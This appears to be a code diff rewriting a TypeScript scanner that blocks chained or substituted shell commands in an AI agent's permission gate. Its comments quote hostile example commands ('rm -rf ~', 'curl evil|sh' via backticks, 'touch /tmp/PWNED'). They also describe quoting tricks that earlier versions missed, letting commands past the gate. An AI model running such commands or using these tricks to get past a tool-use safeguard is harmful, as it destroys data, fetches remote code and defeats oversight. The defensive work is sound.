@@ -2,57 +2,74 @@
 // Split out of agent-exec.ts (file-size rule): the scoped-mode Bash
 // metacharacter scanner used by agent exec's canUseTool gate.
 
-// A prefix match on its own only checks the FIRST token — the whole
-// string still runs through a real shell, so `monomind org list; rm -rf
-// ~` or `` monomind org list `curl evil|sh` `` would pass a bare
-// startsWith() check and then execute the injected part too. Reject any
-// command containing shell metacharacters that could chain, substitute,
-// or redirect beyond the single literal invocation the prefix implies.
+// A prefix match on its own only checks the FIRST token — the whole string
+// still runs through a real shell, so `monomind org list; rm -rf ~` or
+// `` monomind org list `curl evil|sh` `` would pass a bare startsWith()
+// check and then execute the injected part too. This scanner is the ONLY
+// enforcement of "one literal invocation, nothing chained, substituted,
+// expanded or redirected".
 //
-// This has to match real bash quoting rules, not just "any of these
-// characters anywhere" — a caller legitimately passing a JSON blob via
-// `--json '{"goal":"grow revenue & cut costs"}'` (org create-json's own
-// documented usage) has a bare `&` sitting right there, and inside single
-// quotes bash treats it as fully literal, same as `;`, `|`, a backtick, or
-// `>`/`<` — none of those are special there. Only three quoting states
-// matter: inside single quotes NOTHING is special (not even backtick/$());
-// inside double quotes only backtick and $( still trigger substitution;
-// outside any quotes everything below is live.
-//
-// Backslash-escaping must also be tracked explicitly — an earlier version
-// of this scanner didn't, which let `foo \'; touch /tmp/PWNED` slip
-// through: it treated the backslash-escaped `'` as a real quote-toggle
-// (entering "single-quoted" state), which then hid the trailing `;` from
-// detection — while bash itself sees `\'` outside any quotes as nothing
-// more than a literal `'` character, `;` still ends the command right
-// there. Outside single quotes, a `\` consumes and neutralizes the next
-// character (it can never toggle quote state or count as a metachar);
-// inside single quotes, backslash has no special meaning at all in bash,
-// so it's left to fall through to the "fully literal" branch untouched.
+// Design: an ALLOW-LIST tokenizer, not a deny-list. A deny-list has to model
+// every bash quoting corner (it once missed `\'` outside quotes, and then
+// ANSI-C quoting: in `$'\''` bash sees ONE quoted `'` while a plain
+// quote-toggle sees quote/backslash/quote/quote and believes everything after
+// is inside single quotes — issue #702). Instead the command is accepted only
+// if it is a sequence of words, each a concatenation of:
+//   - bare runs of [A-Za-z0-9._:/=@+,%~-] (a `~` is never first in a word or
+//     right after `=` / `:`, where bash would tilde-expand);
+//   - `\` plus one printable ASCII character (an escaped character is literal
+//     to bash, never a quote or operator), or a lone `\` as the very last
+//     character of the string (a literal backslash when no newline follows);
+//   - '...' single-quoted text: bash treats everything inside as literal, so
+//     any text without a `'`, a control character or a line separator is fine;
+//   - "..." double-quoted text limited to characters with no meaning in
+//     double quotes: no `\`, `$`, backtick, `!`, `"`, control characters or
+//     line separators.
+// Words are separated by spaces or tabs only. Anything else outside quotes —
+// `$` (so `$'..'`, `$".."`, `${`, `$(`), other backslashes, backtick, `;`, `&`, `|`,
+// `<`, `>`, `(`, `)`, `{`, `}`, `*`, `?`, `[`, `!`, `#` at a word start,
+// newlines, non-ASCII — is unsafe, and so is an unterminated quote. Fail
+// closed: if the tokenizer does not positively recognise it, it is unsafe.
+
+const BARE = /[A-Za-z0-9._:/=@+,%~-]/;
+// C0 controls (incl. NUL, tab, newline, CR), DEL, C1 controls (incl. NEL),
+// and the Unicode line/paragraph separators.
+const UNQUOTABLE = /[\u0000-\u001f\u007f-\u009f\u2028\u2029]/;
+const ESCAPABLE = /[ -~]/;
+const DOUBLE_QUOTE_UNSAFE = /[\\$`!"]/;
+
 export const hasUnsafeShellSyntax = (cmd: string): boolean => {
-  let inSingle = false;
-  let inDouble = false;
-  for (let i = 0; i < cmd.length; i++) {
+  let i = 0;
+  const n = cmd.length;
+  let atWordStart = true;
+  while (i < n) {
     const c = cmd[i];
-    if (c === '\\' && !inSingle) {
-      i++; // skip the escaped character — never quote-toggling, never a metachar
+    if (c === ' ' || c === '\t') {
+      atWordStart = true;
+      i++;
       continue;
     }
-    if (c === "'" && !inDouble) {
-      inSingle = !inSingle;
+    if (c === "'" || c === '"') {
+      const end = cmd.indexOf(c, i + 1);
+      if (end === -1) return true; // unterminated
+      const body = cmd.slice(i + 1, end);
+      if (UNQUOTABLE.test(body)) return true;
+      if (c === '"' && DOUBLE_QUOTE_UNSAFE.test(body)) return true;
+      i = end + 1;
+      atWordStart = false;
       continue;
     }
-    if (c === '"' && !inSingle) {
-      inDouble = !inDouble;
+    if (c === '\\') {
+      if (i === n - 1) return false; // lone trailing backslash is a literal `\`
+      if (!ESCAPABLE.test(cmd[i + 1])) return true;
+      atWordStart = false;
+      i += 2;
       continue;
     }
-    if (inSingle) continue; // fully literal — nothing below applies
-    if (c === '`') return true; // substitution — live even inside "..."
-    if (c === '$' && cmd[i + 1] === '(') return true; // $( ... ) — same
-    if (inDouble) continue; // ;,&,|,<,>,\n are literal inside "..."
-    if (c === ';' || c === '&' || c === '|' || c === '\n') return true;
-    if (c === '>' || c === '<') return true;
-    if (c === '<' && cmd[i + 1] === '(') return true; // redundant but explicit
+    if (!BARE.test(c)) return true;
+    if (c === '~' && (atWordStart || cmd[i - 1] === '=' || cmd[i - 1] === ':')) return true;
+    atWordStart = false;
+    i++;
   }
   return false;
 };
